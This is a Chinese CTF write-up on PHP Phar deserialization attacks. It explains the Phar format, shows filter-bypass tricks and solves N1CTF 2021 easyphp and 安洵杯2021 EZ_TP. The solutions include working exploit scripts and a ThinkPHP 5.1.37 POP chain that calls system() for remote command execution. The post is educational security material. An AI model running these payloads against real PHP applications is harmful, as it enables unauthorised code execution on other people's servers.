---
title: 浅谈Phar反序列化漏洞利用：N1CTF 2021 easyphp & 安洵杯2021 EZ_TP
date: 2021-11-28 13:35
tags:
- Phar
- 反序列化
- PHP
categories: 
- CTF
---
# Phar

## 什么是Phar

> PHp ARchive, like a Java JAR, but for PHP.

phar（PHp ARchive）是类似于JAR的一种打包文件。PHP ≥5.3对Phar后缀文件是默认开启支持的，不需要任何其他的安装就可以使用它。

> phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程序分布在一个文件中并从该文件中运行的方法。

说白了，就是一种压缩文件，但是不止能放压缩文件进去。

在做进一步探究之前需要先调整配置，因为对于Phar文件的相关操作，php缺省状态是只读的（也就是说单纯使用Phar文件不需要任何的调整配置）。但是因为我们现在需要创建一个自己的Phar文件，所以需要允许写入Phar文件，这需要修改一下 `php.ini`

打开 `php.ini`，找到 `phar.readonly` 指令行，修改成：

```php
phar.readonly = 0
```

即可。

---

## Phar文件格式

Phar文件由四部分组成：

**1.stub**

stub是phar文件的文件头，格式为`xxxxxx<?php ...;__HALT_COMPILER();?>`，xxxxxx可以是任意字符，包括留空，且php闭合符与最后一个分号之间不能有多于一个的空格符。另外php闭合符也可省略。

**2.manifest describing the contents**

该区域存放phar包的属性信息，允许每个文件指定文件压缩、文件权限，甚至是用户定义的元数据，如文件用户或组。

![](format.png)

这里面的metadata以serialize形式储存，为反序列化漏洞埋下了伏笔。

**3.file contents**

被压缩的用户添加的文件内容

4.**signature**

可选，phar文件的签名，允许的有MD5, SHA1, SHA256, SHA512和OPENSSL.

![signature](signature.png)

这部分以`GBMB`（47 42 4d 42）结尾。

需要注意，stub不一定要在文件开头。

## 利用方式

在2018 Black Hat上，安全研究员`Sam Thomas`分享了议题`It’s a PHP unserialization vulnerability Jim, but not as we know it` .

[https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf)

> 利用phar文件会以序列化的形式存储用户自定义的**meta-data**这一特性，拓展了php反序列化漏洞的攻击面。该方法在**文件系统函数**（file_exists()、is_dir()等）参数可控的情况下，配合**phar://伪协议**，**可以不依赖unserialize()直接进行反序列化操作**。
>

也就是说，如果我们能控制传入以下函数的参数，就有潜在的phar反序列化漏洞利用可能：

![](func.png)

还有一些别的函数可用，可参考这篇：[https://www.freebuf.com/articles/web/205943.html](https://www.freebuf.com/articles/web/205943.html)

**试试看？**

我们先来生成一个phar：

```php
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

注意这边$o反序列化只会保存数据不会保存方法。执行完毕后，我们来观察phar文件的内容：

![](hex.png)

GBMB结尾的签名以及序列化后的metadata清晰可见。

```php
<?php 
    class TestObject {
        public function __destruct() {
            echo 'Destruct called';
        }
    }

    $filename = 'phar://phar.phar/test.txt';//既然是压缩文件，我们可以如此访问其中的某个文件
    file_get_contents($filename); 
?>
```

在上面的程序执行之后，我们会发现它输出了“Destruct called”.这是由于phar被解析的时候，metadata被反序列化了，于是该实例被析构时调用__destruct函数。这便是反序列化漏洞的来由。

PHP ≥5.3默认支持phar文件；而在PHP8中，该漏洞被修复：metadata不会自动被反序列化了。（来源请求）

---

## **phar://是什么**

前面提到，我们解析phar文件常常使用phar://伪协议。CTF中，由于伪协议提供了一系列对于文件的封装协议，使得当源程序有可控的文件包含函数时，我们有机会利用这些协议控制其返回值或是完成一些预料外操作（例如反序列化）。作为伪协议的一种，由于phar本质上就是一个特殊的压缩文件，所以phar://和zip://其实有很多相似之处，都可以访问压缩包中的子文件，并且zip://需要文件绝对路径，phar://并不需要。（来源请求）

---

## **小tricks**

### 绕过前缀过滤

队里师傅的几个example可以类比使用，都是在前缀非phar://的情况下调用了phar://

compress.bzip2和compress.zlib

```php
<?php
$z = 'compress.bzip2://phar:///home/sx/test.phar/test.txt';
$z = 'compress.zlib://phar:///home/sx/test.phar/test.txt';
file_get_contents($z);
```

php://

```php
<?php
include('php://filter/read=convert.base64-encode/resource=phar://phar.phar');
file_get_contents('php://filter/read=convert.base64-encode/resource=phar://phar.phar');
```

---

### 简单的绕过

我们可以利用stub部分前缀任意的特性：

```php
<?php
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');   //设置 stub，增加 gif 文件头
```

这可以绕过一部分对文件头的检测。

---

### 绕过前后脏数据

由于签名部分的存在，php会校验文件哈希值，并检查末尾是否为GBMB，如下是解析部分的源码：

![](src.png)

[https://github.dev/php/php-src](https://github.dev/php/php-src)

可见，如果末尾不是GBMB会直接导致解析失败。

在CTF中利用该漏洞需要我们完成写入/上传phar，并调用文件包含函数。我们知道一句话木马由于有`<?php ?>`这样的头尾标识存在，可以无视前后脏数据；然而对于phar，这样的骚操作被签名部分阻止了。有办法绕过吗？请参阅：[https://www.php.net/manual/zh/phar.converttoexecutable.php](https://www.php.net/manual/zh/phar.converttoexecutable.php)

利用convertToExecutable函数，我们可以把phar文件转为其他格式的phar文件，例如.tar和.zip格式。

我们以N1CTF easyphp为例子，这题允许我们写入日志，并且可以利用phar反序列化得到flag，难点在于日志文件前后有额外脏数据，会使得我们的phar文件无法被解析。

然而如果以tar格式储存phar，末尾的脏数据并不会影响解析（这是tar的格式决定的），而开头的脏数据可以在制造phar文件时就提前构造好（这样这部分数据也会被纳入签名计算），写入日志时不必写入这部分，而是令其与脏数据拼接形成合法的phar。exploit如下：

```php
<?php
  CLASS FLAG {
    public function __destruct(){
            echo "FLAG: " . $this->_flag;
        } 
    }
    $sb = $_GET['sb'];
    $ts = $_GET['ts'];
    $phar = new Phar($sb.".phar"); //后缀名必须为phar
    **$phar = $phar->convertToExecutable(Phar::TAR); //会生成*.phar.tar**
    
    $phar->startBuffering();
    $phar->addFromString("Time: ".$ts." IP: [], REQUEST: [log_type=".$sb."], CONTENT: [", ""); //添加要压缩的文件
    //tar文件开头是第一个添加文件的的文件名，注意添加的文件顺序不要错了
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new FLAG();
  $o -> data = 'g0dsp3ed_1s_g0D';
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    //签名自动计算
    $phar->stopBuffering();
?>
```

把这个跑在本地web服务上，然后写个脚本（当时半夜赶制的很丑会留下一些垃圾文件 求轻喷 队里师傅写的干净多了）：

```python
import requests as rq
import json 
import time
import random
ip = '<here_is_remote_ip>'
def generate_random_str(randomlength=16):
  """
  生成一个指定长度的随机字符串
  """
  random_str = ''
  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
  length = len(base_str) - 1
  for i in range(randomlength):
    random_str += base_str[random.randint(0, length)]
  return random_str
def new_one(offset):
    rd = generate_random_str(4)
    ts2 = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()+offset))
    ts = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
    res = rq.get(url=f"http://127.0.0.1/test.php?sb={rd}&ts={ts2}")  # 访问本地生成phar
    with open(f'{rd}.phar.tar',"rb") as f: 
        data = f.read()
    data = data[70::]#去掉前面的冗余部分以便和log前面拼接形成合法*.phar.tar
    headers = {'content-type': 'application/x-www-form'}  # 源文本
    res = rq.post(url=f"http://43.155.59.185:53340/log.php?log_type={rd}",data=data)  # 写入日志
    res = rq.post(url=f"http://43.155.59.185:53340?file=phar://./log/{ip}/{rd}_www.log")  # 反序列化
    print(res.text)
for i in range(-30,30):#考虑本地和远程的时间差异，这边设置个30s的窗口期
    new_one(i)
    time.sleep(0.9)
"""生成的文件长这样（看个开头就行）
00000000: 5469 6d65 3a20 3230 3231 2d31 312d 3232  Time: 2021-11-22
00000010: 2030 363a 3533 3a31 3520 4950 3a20 5b5d   06:53:15 IP: []
00000020: 2c20 5245 5155 4553 543a 205b 5d2c 2043  , REQUEST: [], C
00000030: 4f4e 5445 4e54 3a20 5b5f 5f5f 5f5f 5f5f  ONTENT: [_______
00000040: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________
00000050: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________
00000060: 5f5f 5f5f 3030 3030 3634 3400 0000 0000  ____0000644.....
00000070: 0000 0000 0000 0000 0000 0000 3030 3030  ............0000
00000080: 3030 3030 3032 3400 3134 3134 3636 3337  0000024.14146637
00000090: 3133 3300 3030 3233 3534 3320 3000 0000  133.0023543 0...
000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
"""
```

不只是tar，还有别的格式：

![](targz.png)
[https://www.php.net/manual/zh/phar.converttoexecutable.php](https://www.php.net/manual/zh/phar.converttoexecutable.php)

对应的代码：

```php
<?php
$phar = $phar->convertToExecutable(Phar::TAR,Phar::BZ2);//会生成xxxx.phar.tar.bz2
$phar = $phar->convertToExecutable(Phar::TAR,Phar::GZ);//会生成xxxx.phar.tar.gz
$phar = $phar->convertToExecutable(Phar::ZIP);//会生成xxxx.phar.zip
```

---

### **POP链**

POP(property oriented programming)，说白了就是经过一连串的魔术方法/特殊方法调用达到特定目的的一种攻击方式，本质是通过在调用这些方法的过程中又触发了别的特殊方法，引发连锁反应直到触及目标。phar反序列化使得不存在unserilize函数时这样的攻击也能成功，这正是所谓“扩大攻击面”。我们以刚刚结束的安洵杯2021 EZ_TP为例子。

网站使用ThinkPHP V5.1.37，网上已有现成的[POP链](https://blog.csdn.net/lllffg/article/details/116145918)，现在需要我们在没有unserilize函数的情况下完成反序列化攻击。

```php
<?php
namespace app\index\controller;
use think\Controller;

class Index extends controller
{
    public function index()
    {
        return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:) </h1><p> ThinkPHP V5.1<br/><span style="font-size:30px">12载初心不改（2006-2018） - 你值得信赖的PHP框架</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
    }

    public function hello()
    {
        highlight_file(__FILE__);
        $hello = base64_encode('Welcome to D0g3');
        if (isset($_GET['hello'])||isset($_POST['hello'])) exit;
        if(isset($_REQUEST['world']))
        {
            parse_str($_REQUEST['world'],$haha);
            extract($haha);
        }
        if (!isset($a)) {
            $a = 'hello.txt';
        }
        $s = base64_decode($hello);
        file_put_contents('hello.txt', $s);
        if(isset($a))
        {
            echo (file_get_contents($a));
        }
    }
}
```

parse_str()和extract()使得我们可以通过变量覆盖完成文件写入与任意读取，并且$a可以使用伪协议。那么接下来的事情就理所应当了：往hello.txt里写入一个phar，metadata里面放ThinkPHP 5.1.37 的反序列化利用链，完成RCE.(关于这个POP链的原理请参阅[https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-反序列化漏洞/Thinkphp-5.1.37-反序列化漏洞.html](https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html) 讲的很详细)

```php
<?php
namespace think{
    abstract class Model{
        protected $append = [];
        private $data = [];
        function __construct(){
            $this->append = ["ethan"=>["godspeedyyds","xtxyyds"]];
            $this->data = ["ethan"=>new Request()];
        }
    }
    class Request{
        protected $hook = [];
        protected $filter = "system";
        protected $config = [
            'var_method'       => '_method',
            'var_ajax'         => '_ajax',
            'var_pjax'         => '_pjax',
            'var_pathinfo'     => 's',
            'pathinfo_fetch'   => [
                'ORIG_PATH_INFO',
                'REDIRECT_PATH_INFO',
                'REDIRECT_URL'
            ],
            'default_filter'   => '',
            'url_domain_root'  => '',
            'https_agent_name' => '',
            'http_agent_ip'    => 'HTTP_X_REAL_IP',
            'url_html_suffix'  => 'html',
        ];
        protected $param = ['cat /y0u_f0und_It'];
        function __construct(){
            $this->filter = "system";
            $this->config = ["var_ajax"=>''];
            $this->hook = ["visible"=>[$this,"isAjax"]];
        }
    }
}

namespace think\process\pipes{
    use think\model\concern\Conversion;
    use think\model\Pivot;
    class Windows{
        private $files = [];

        public function __construct(){
            $this->files = [new Pivot()];
        }
    }
}

namespace think\model{
    use think\Model;

    class Pivot extends Model{

    }
}

namespace{
    use think\process\pipes\Windows;
    $w = new Windows();

    $p = new Phar('phar.phar');
    $p->startBuffering();
    $p->setStub('<?php __HALT_COMPILER();?>');
    $p->setMetadata($w);
    $p->addFromString("test", "12345");
    $p->stopBuffering();
}
```

执行后生成phar，然后执行脚本

```python
import requests
import urllib.parse
import base64
import os
with open('phar.phar','rb') as f:
    s = f.read()

s = urllib.parse.quote(base64.b64encode(s).decode())
# print(s)
remote = '<here_is_remote_ip>'
sess =requests.session()
r = sess.post(
    url = f'http://{remote}/index.php/index/index/hello',
    params={
        'ethan':'<here_is_your_shell_command>'
    },
    data = {
        'world':f'hello={s}&a=phar://./hello.txt'
    }
)
print(r.text)
```

成功RCE

---

## 总结

phar反序列化提供了一种扩展反序列化漏洞攻击面的方式、入口，所以基于unserialize()函数的各类攻击tricks（比如引用绕过之类的）依然适用。鉴于phar反序列化漏洞设计版本较多，相信CTF比赛中它仍然会稳定出场。

---

参考资料：

[Thinkphp-5.1.37-反序列化漏洞](https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html)

[https://www.php.net/manual/zh/class.phar.php](https://www.php.net/manual/zh/class.phar.php)

[Thinkphp 5.1.37反序列化漏洞](https://blog.csdn.net/lllffg/article/details/116145918)

[us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)

[https://github.dev/php/php-src](https://github.dev/php/php-src)

[packaging-your-php-apps-with-phar](https://www.webhek.com/post/packaging-your-php-apps-with-phar.html)

[PHAR反序列化拓展操作总结](https://www.freebuf.com/articles/web/205943.html)
